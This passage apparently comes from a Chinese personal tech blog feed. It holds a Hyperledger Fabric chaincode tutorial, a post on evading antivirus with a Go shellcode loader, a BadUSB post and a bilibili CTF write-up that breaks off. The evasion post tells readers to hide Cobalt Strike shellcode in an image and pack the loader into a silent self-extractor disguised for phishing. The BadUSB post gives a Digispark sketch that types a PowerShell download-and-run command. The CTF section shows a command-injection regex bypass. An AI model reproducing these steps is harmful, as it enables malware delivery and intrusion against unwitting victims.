class="headerlink" title="3 通过链码定义"></a>3 通过链码定义</h2><p>安装链码包后，需要通过组织的链码定义。该定义包括链码管理的重要参数，例如名称，版本和链码认可策略。</p><p>如果组织已在其peer节点上安装了链码，则他们需要在其组织通过的链码定义中包括包ID。包ID用于将peer节点上安装的链码与通过的链码定义相关联，并允许组织使用链码来认可交易。</p><h3 id="3-1-查询包ID"><a href="#3-1-查询包ID" class="headerlink" title="3.1 查询包ID"></a>3.1 查询包ID</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">peer lifecycle chaincode queryinstalled</span><br></code></pre></td></tr></table></figure><p>通过链码时，我们将使用包ID，因此，将包ID保存为环境变量。将返回的包ID粘贴到下面的命令中。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>-demo_<span class="hljs-number">1</span>:cf<span class="hljs-number">57</span>bbad<span class="hljs-number">4747</span>cb<span class="hljs-number">1</span>eb<span class="hljs-number">45</span>ae<span class="hljs-number">22</span>fd<span class="hljs-number">95</span>f<span class="hljs-number">6</span>e<span class="hljs-number">7</span>aa<span class="hljs-number">04</span>a<span class="hljs-number">72</span>df<span class="hljs-number">4</span>d<span class="hljs-number">109518</span>f<span class="hljs-number">5</span>a<span class="hljs-number">7</span>e<span class="hljs-number">31</span>a<span class="hljs-number">657</span>fa<span class="hljs-number">442</span><br><span class="hljs-comment">#链码id</span><br><span class="hljs-attribute">export</span> CC_PACKAGE_ID=java_gateway_demo_<span class="hljs-number">1</span>:cf<span class="hljs-number">57</span>bbad<span class="hljs-number">4747</span>cb<span class="hljs-number">1</span>eb<span class="hljs-number">45</span>ae<span class="hljs-number">22</span>fd<span class="hljs-number">95</span>f<span class="hljs-number">6</span>e<span class="hljs-number">7</span>aa<span class="hljs-number">04</span>a<span class="hljs-number">72</span>df<span class="hljs-number">4</span>d<span class="hljs-number">109518</span>f<span class="hljs-number">5</span>a<span class="hljs-number">7</span>e<span class="hljs-number">31</span>a<span class="hljs-number">657</span>fa<span class="hljs-number">442</span><br></code></pre></td></tr></table></figure><h3 id="3-2-Org2-通过链码定义"><a href="#3-2-Org2-通过链码定义" class="headerlink" title="3.2 Org2 通过链码定义"></a>3.2 Org2 通过链码定义</h3><p>因为已经设置了环境变量为peer CLI作为Orig2管理员进行操作，所以我们可以以Org2组织级别将 java_gateway_demo 的链码定义通过。使用 peer lifecycle chaincode approveformyorg命令通过链码定义：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode approveformyorg -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID mychannel --name java_gateway_demo_1 --version <span class="hljs-number">1.0</span> --package-id <span class="hljs-variable">$CC_PACKAGE_ID</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br></code></pre></td></tr></table></figure><h3 id="3-3Org1-通过链码定义"><a href="#3-3Org1-通过链码定义" class="headerlink" title="3. 3Org1 通过链码定义"></a>3. 3Org1 通过链码定义</h3><p>设置以下环境变量以Org1管理员身份运行：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org1MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:7051<br></code></pre></td></tr></table></figure><p>用 peer lifecycle chaincode approveformyorg命令通过链码定义</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode approveformyorg -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID mychannel --name java_gateway_demo_1 --version <span class="hljs-number">1.0</span> --package-id <span class="hljs-variable">$CC_PACKAGE_ID</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br></code></pre></td></tr></table></figure><h2 id="4-将链码定义提交给通道"><a href="#4-将链码定义提交给通道" class="headerlink" title="4 将链码定义提交给通道"></a>4 将链码定义提交给通道</h2><p>使用peer lifecycle chaincode checkcommitreadiness命令来检查通道成员是否已批准相同的链码定义：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode checkcommitreadiness --channelID mychannel --name java_gateway_demo_1 --version <span class="hljs-number">1.0</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem --output json<br></code></pre></td></tr></table></figure><p>该命令将生成一个JSON映射，该映射显示通道成员是否批准了checkcommitreadiness命令中指定的参数：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;approvals&quot;</span>: &#123;<br><span class="hljs-attr">&quot;Org1MSP&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-attr">&quot;Org2MSP&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><strong><font color="red">由于作为通道成员的两个组织都同意了相同的参数，因此链码定义已准备好提交给通道。你可以使用peer lifecycle chaincode commit命令将链码定义提交到通道。commit命令还需要由组织管理员提交。</font></strong><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode commit -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID mychannel --name java_gateway_demo_1 --version <span class="hljs-number">1.0</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem --peerAddresses localhost:<span class="hljs-number">7051</span> --tlsRootCertFiles <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls<span class="hljs-regexp">/ca.crt --peerAddresses localhost:9051 --tlsRootCertFiles $&#123;PWD&#125;/</span>organizations<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt<br></code></pre></td></tr></table></figure><p>可以使用peer lifecycle chaincode querycommitted命令来确认链码定义已提交给通道。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode querycommitted --channelID mychannel --name java_gateway_demo_1 --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br></code></pre></td></tr></table></figure><p>如果将链码成功提交给通道，该querycommitted命令将返回链码定义的顺序和版本:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Version:</span> <span class="hljs-number">1.0</span><span class="hljs-string">,</span> <span class="hljs-attr">Sequence:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">Endorsement Plugin:</span> <span class="hljs-string">escc,</span> <span class="hljs-attr">Validation Plugin:</span> <span class="hljs-string">vscc,</span> <span class="hljs-attr">Approvals:</span> [<span class="hljs-attr">Org1MSP:</span> <span class="hljs-literal">true</span>, <span class="hljs-attr">Org2MSP:</span> <span class="hljs-literal">true</span>]<br></code></pre></td></tr></table></figure><h2 id="5-调用链码"><a href="#5-调用链码" class="headerlink" title="5 调用链码"></a>5 调用链码</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer chaincode invoke -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem -C mychannel -n java_gateway_demo_1 --peerAddresses localhost:<span class="hljs-number">7051</span> --tlsRootCertFiles <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls<span class="hljs-regexp">/ca.crt --peerAddresses localhost:9051 --tlsRootCertFiles $&#123;PWD&#125;/</span>organizations<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt -c <span class="hljs-string">&#x27;&#123;&quot;function&quot;:&quot;userRegister&quot;,&quot;Args&quot;:[&quot;test&quot; , &quot;test&quot;]&#125;&#x27;</span><br><br>peer chaincode query -C mychannel -n hyperledger-fabric-contract-java-demo -c <span class="hljs-string">&#x27;&#123;&quot;Args&quot;:[&quot;queryAsset&quot; , &quot;test&quot;]&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>看到 Chaincode invoke successful. result: status:200 信息证明链码调用成功:</p>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chaincode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>go_bypass</title>
    <link href="/2021/12/08/go-bypass/"/>
    <url>/2021/12/08/go-bypass/</url>
    
    <content type="html"><![CDATA[<p>实验室摸鱼之余找到了一篇基于go语言的一个免杀项目，于是手痒立刻上手试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs https://github.com/Hangingsword/HouQing">https://github.com/Hangingsword/HouQing<br></code></pre></td></tr></table></figure><p>该项目使用的是golang语言，可以快速生成exe可执行文件</p><p>下载完是两个文件：</p><p>​                <img src="/2021/12/08/go-bypass/image-20210927165424984.png" alt="image-20211208105743208"></p><p>其中code.go是用来生成加载了shellcode的图片，loader.go则是加载器。(原理类似与分离免杀</p><p>首先需要先打开code.go文件，修改如图的两个key值</p><img src="/2021/12/08/go-bypass/image-20210927165631535.png" alt="image-20210927165631535.png" style="zoom: 67%;"><p>其中code.go和Loader.go修改的值需要相同，然后通过cs生成一个java的shellcode</p><p>image-20210927170154557.png</p><p>然后将生成的shellcode放到code.go中进行一个xor混淆</p><p><img src="/2021/12/08/go-bypass/image-20210927170154557.png" alt="image-20210927170154557"></p><p>然后随便找一个图片进行shellcode注入（注入的时候记得关本地的杀毒要不然会报错），然后将注入成功后的图片放入服务器上，用python开一个http服务。</p><p><img src="/2021/12/08/go-bypass/image-20210927170629262.png" alt="image-20210927170629262"></p><p>再在加载器Loader.go中修改成自己服务器地址</p><img src="/2021/12/08/go-bypass/image-20210927170801795.png" alt="image-20210927170801795" style="zoom: 67%;"><p>在本地进行测试一下，成功上线</p><p><img src="/2021/12/08/go-bypass/image-20210927171155128.png" alt="image-20210927171155128"></p><p>此时我们可以用go对这个文件进行一个加工，通过执行命令让其生成一个可执行文件</p><figure class="highlight go"><figcaption><span>build -ldflags</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> build -ldflags=<span class="hljs-string">&quot;-H windowsgui&quot;</span> Loader.<span class="hljs-keyword">go</span>  <span class="hljs-comment">//-ldflags=&quot;-H windowsgui&quot; 防止弹窗</span><br>尝试用<span class="hljs-keyword">go</span>将文件编译并带上图片但是发现再点击直接无法上线了，文件也被压缩了一半(太菜了原理还不太懂还得研究一下)，这个方法gg，换一个方法用自解压试试。<br></code></pre></td></tr></table></figure><p>使用Winrar把你需要的文件和免杀的马子一起打包，我这里用的是图片。</p><ul><li><p>首先选择自解压格式，然后–&gt;高级–&gt;自解压文件选项</p></li><li><p>解压路径随便设置这里设置的是c:/windows/temp</p></li><li><p>安装解压后运行:</p></li><li><pre><code>c:/windows/temp/test.jpg     c:/windows/temp/by_pass.exe</code></pre></li><li><p>模式–&gt;静默模式隐藏全部</p></li><li><p>更新–&gt;解压并更新文件和覆盖全部文件</p></li></ul><p><img src="/2021/12/08/go-bypass/image-20210927171733745.png" alt="image-20210927171733745"></p><p>生成好了之后在使用Resource Hacker将其图片替换一下就可以用来钓鱼了dddd</p><p>测试结果(亲测可以过火绒、defender、360)</p><p><img src="/2021/12/08/go-bypass/image-20210927172534445.png"></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Badusb</title>
    <link href="/2021/12/08/Badusb/"/>
    <url>/2021/12/08/Badusb/</url>
    
    <content type="html"><![CDATA[<p>Badusb制作</p><p>实验室摸鱼的时候没来由又想玩玩近源渗透所以就有了这篇文章，没什么技术含量单纯是好玩整活用的大佬勿喷。</p><h3 id="HID攻击原理"><a href="#HID攻击原理" class="headerlink" title="HID攻击原理"></a>HID攻击原理</h3><p>HID是Human Interface Device的缩写，是直接与人交互的设备，比如键盘、鼠标等等。攻击者可以将usb模拟成键盘，让电脑识别成为键盘，然后进行脚本模拟按键攻击。这种常用于近源渗透，可以配合社工一起使用。</p><p>HID攻击可以分为很多种，比如Teensy和USB Rubber ducky等等，这里使用的digispark。</p><h5 id="两种不同攻击的优势与劣势"><a href="#两种不同攻击的优势与劣势" class="headerlink" title="两种不同攻击的优势与劣势"></a>两种不同攻击的优势与劣势</h5><ul><li>橡皮鸭它最初作为一个IT自动化的POC，通过嵌入式开发板实现的。橡皮鸭通过简单的脚本语言、强大的硬件以及出色的伪装能力，成功的成为了极客们必不可少的工具，十分的方便，但是价格不太便宜。HAK5网站上的大黄鸭更是动不动就几十美刀，不过其实有很多HACK5的工具完全可以自制。</li><li>Teensy是一套完整的基于USB微控制器的开发系统，在占用极少资源的情况下可以实现多种多样的项目。所有的编程可以通过USB端口进行或者使用ISP接口进行编程的。多方便，而且它的体积就两个角硬币那么大，同时可以模拟多种硬件，还有多余的I/O口可以供极客们随意改装.它的价格也是十分的便宜.就20RMB就可以入手啦。</li></ul><p>使用不同的开发板，所写的代码和驱动都是不一样的，所以使用的时候需要看准自己购买的型号。</p><h5 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h5><p>1.直接淘宝购买一块digispark的开发板就可以直接使用了，如果想要美观欺骗性更强可以选择购买带usb壳的开发板。</p><p>2.(可有可无)公网vps可以用来挂http服务用来下载马子执行。</p><p>3.cs或者msf</p><p>4.Arduino用来烧录开发板</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">Arduino下载地址（国内论坛）https:<span class="hljs-regexp">//</span>www.arduino.cn/thread-<span class="hljs-number">5838</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>.html<br>Arduino官方下载地址https:<span class="hljs-regexp">//</span>www.arduino.cc<span class="hljs-regexp">/en/</span>Main/Software<br>下载的时候需要看清,digispark好像没有版本要求，但是Teensy的安装包是有对应的Arduino版本要求的<br></code></pre></td></tr></table></figure><p>下载完之后直接安装就可以，安装好之后在Arduino中加入对应的digispark开发板的支持(配置文件的下载需要翻墙,需要提前准备好梯子。)</p><h5 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h5><p>在文件–&gt;首选项中加入附加开发版管理</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>digistump.com/package_digistump_index.json<br></code></pre></td></tr></table></figure><p><img src="/2021/12/08/Badusb/image-20211024200506100.png" alt="image-20211024200506100"></p><p>在工具–&gt;开发板中打开开发板管理器，找到Digistump AVR Boards安装就可以(安装过程需要挂代理).</p><p><img src="/2021/12/08/Badusb/image-20211024200745515.png" alt="image-20211024200745515"></p><p>安装好之后就可以开始对digispark进行烧录程序了，可以直接在Arduino中编程了，开始默认有两个函数，一个setup()一个loop()，在插入开发板之后会执行一次setup()函数，然后循环loop()函数。其中代码是用的C语言</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">github一些开源的代码，只需要拿来稍微修改一下就可以用了<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/hak5darren/</span>USB-Rubber-Ducky<span class="hljs-regexp">/wiki/</span>Payloads<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CedArctic/</span>DigiSpark-Scripts<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/digistump/</span>DigisparkArduinoIntegration<br></code></pre></td></tr></table></figure><p>example:</p><p><img src="/2021/12/08/Badusb/image-20211024201742845.png" alt="image-20211024201742845"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;DigiKeyboard.h&quot;</span><br><br>void setup<span class="hljs-literal">()</span> &#123;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(0)</span>;<br><br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">3000</span>);<span class="hljs-comment">//延迟</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_R, MOD_GUI_LEFT)</span>;<span class="hljs-comment">//win+R键</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">500</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>println(<span class="hljs-string">&quot;cmd&quot;</span>);<span class="hljs-comment">//输入cmd</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<span class="hljs-comment">//回车</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">500</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>print(<span class="hljs-string">&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://localhost/bypass.exe&#x27;,&#x27;D:\\bypass.exe&#x27;);\&quot;&quot;</span>);<span class="hljs-comment">//执行的命令</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">500</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>println(<span class="hljs-string">&quot;D:\\Pictures.exe&quot;</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">200</span>);<br><br>&#125;<br><br>void loop<span class="hljs-literal">()</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>点了上传键之后在60s之内插入你的u盘可以直接烧录成功了。</p><p><img src="/2021/12/08/Badusb/image-20211024201939631.png" alt="image-20211024201939631"></p><p><del>谁插谁上线，用了都说好</del></p><p>除了powershell下载的思路其他思路就不用我多说了(可以结合前一篇文章的免杀一同食用效果更佳)，大师傅们肯定还有很多其他的骚操作dddd</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Badusb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bilibili_1024</title>
    <link href="/2021/10/24/bilibili-1024/"/>
    <url>/2021/10/24/bilibili-1024/</url>
    
    <content type="html"><![CDATA[<h2 id="bilibili-1024-CTF"><a href="#bilibili-1024-CTF" class="headerlink" title="bilibili 1024 CTF"></a>bilibili 1024 CTF</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1024</span>程序员节，大家一起和<span class="hljs-number">2233</span>参与解密游戏吧~<br>happy_<span class="hljs-number">1024_2233</span>:<br>e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf<span class="hljs-number">084d364</span><br><span class="hljs-number">0408</span>abca7deabb96a58f50471171b60e02b1a8dbd32db156<br></code></pre></td></tr></table></figure><p>看不懂解密直接一把梭，解密全试错了一遍，猜测happy_1024_2233应该是密钥，试了一下AES还是没解出来，后面又找了几个网站试了一下</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">在线AES加密解密工具。AES采用对称分组密码体制，密钥长度支持为<span class="hljs-number">128</span><span class="hljs-regexp">/192/</span><span class="hljs-number">256</span>bits。用户密钥长度不足时，平台将以<span class="hljs-number">0</span>x00自动填充。IV也一样，自动填充，超出部分将被忽略。加密时会将明文数据按<span class="hljs-number">16</span><span class="hljs-keyword">byte</span>进行分组，不足<span class="hljs-number">16</span><span class="hljs-keyword">byte</span>时将用特定的Padding（如PCKS7）字符进填充，所以不同的Padding方式密文最后一段可能不一样。如果没有特别指明平台将使用UTF8编码处理数据（如KEY/IV）。<br></code></pre></td></tr></table></figure><p>所以直接用百度搜的平台没办法CV直接出结果，这时候删掉换行改输出为hex则可以直接得出结果（填充不影响结果的输出）</p><p><img src="/2021/10/24/bilibili-1024/image-20211025110201191.png" alt="image-20211025110201191"></p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">某高级前端开发攻城狮更改了一个前端配置项<br>https:<span class="hljs-regexp">//</span>security.bilibili.com<span class="hljs-regexp">/sec1024/</span>q/<br></code></pre></td></tr></table></figure><p>打开发现是一个前端的页面直接F12大法看到一句提示Please enable JavaScript to continue.猜测可能是信息泄露，flag可能在js中，直接右键查看源码毛都没发现。</p><p><img src="/2021/10/24/bilibili-1024/image-20211025110505504.png" alt="image-20211025110505504"></p><p><del>首页看到用户名为test，猜测可能是越权，bp抓包看到token找了好久的token毛都没找到</del>。回到之前的想法信息泄露F12查看源代码意外中发现了一个webpack，之前看ChaMd5的文章有看到过这个信息泄露。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1400138</span><br></code></pre></td></tr></table></figure><p>直接在home.vue中找到flag</p><p><img src="/2021/10/24/bilibili-1024/image-20211025111331350.png" alt="image-20211025111331350"></p><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">PHP <span class="hljs-keyword">is</span> the best <span class="hljs-keyword">language</span> <span class="hljs-keyword">for</span> web programming, but what about other languages?<br>http<span class="hljs-variable">s:</span>//security.bilibili.<span class="hljs-keyword">com</span>/sec1024/q/<span class="hljs-built_in">eval</span>.zip<br></code></pre></td></tr></table></figure><p>直接源码审计</p><ul><li>传入的参数count()之后要小于3</li><li>\w正则匹配0-9a-zA-Z</li><li>输入命令才会回显</li></ul><p>看到preg_match就知道是绕过preg了，直接百度搜一下<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">preg_match绕过总结 </a>可以看到正则的结尾为$，所以可以直接用%0a进行绕过，$会忽略句尾的%0a，直接构造payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>    /* <br>        bilibili- ( ゜- ゜)つロ 乾杯~<br>        uat: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">3.2</span><span class="hljs-regexp">/uat/</span>eval.php<br>        pro: http:<span class="hljs-regexp">//</span>security.bilibili.com<span class="hljs-regexp">/sec1024/</span>q<span class="hljs-regexp">/pro/</span>eval.php<br>    */<br>    <span class="hljs-variable">$args</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (count(<span class="hljs-variable">$args</span>) &gt;<span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;count(<span class="hljs-variable">$args</span>); <span class="hljs-variable">$i</span>++ )&#123;  <br>        <span class="hljs-keyword">if</span> ( !preg_match(<span class="hljs-string">&#x27;/^\w+$/&#x27;</span>, <span class="hljs-variable">$args</span>[<span class="hljs-variable">$i</span>]) ) &#123;<br>            <span class="hljs-keyword">exit</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-regexp">//</span> todo: other filter<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;/bin/2233 &quot;</span> . implode(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$args</span>);<br>    exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$out</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;count(<span class="hljs-variable">$out</span>); <span class="hljs-variable">$i</span>++)&#123;<br>        echo(<span class="hljs-variable">$out</span>[<span 